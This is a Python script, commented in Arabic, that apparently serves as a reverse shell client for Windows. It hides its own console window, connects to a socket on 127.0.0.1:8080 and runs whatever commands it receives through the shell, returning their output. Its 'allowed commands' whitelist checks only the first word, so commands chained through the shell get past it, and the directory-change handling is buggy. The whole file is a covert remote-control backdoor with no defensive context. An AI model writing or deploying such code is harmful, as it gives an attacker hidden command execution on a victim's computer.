import ctypes
import socket
import subprocess
import os

def hide():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def execute_command(command):
    """تنفيذ الأمر وإرجاع الإخراج."""
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout + output.stderr
    except Exception as e:
        return str(e)

def connect():
    hide()  # إخفاء النافذة
    s = socket.socket()
    s.connect(("127.0.0.1", 8080))  # استخدام localhost

    # قائمة بيضاء للأوامر المسموح بها
    allowed_commands = {
        'cd',
        'dir',
        'echo',
        'mkdir',
        'rmdir',
        'pwd',      # قد لا يعمل في Windows
        'ipconfig', # إضافة الأمر ipconfig
        'ping',     # إضافة الأمر ping
        'tracert',  # إضافة الأمر tracert
        'netstat'   # إضافة الأمر netstat
    }

    while True:
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break

        command_name = command.split()[0]  # الحصول على اسم الأمر فقط

        # التحقق مما إذا كان الأمر في قائمة الأوامر المسموح بها
        if command_name in allowed_commands:
            if command.startswith("cd "):
                try:
                    os.chdir(command.strip("cd "))
                    s.send(b"Changed directory")
                except FileNotFoundError as e:
                    s.send(str(e).encode())
            else:
                output = execute_command(command)
                s.send(output.encode())
        else:
            s.send(b"Command not allowed")

    s.close()

if __name__ == "__main__":
    connect()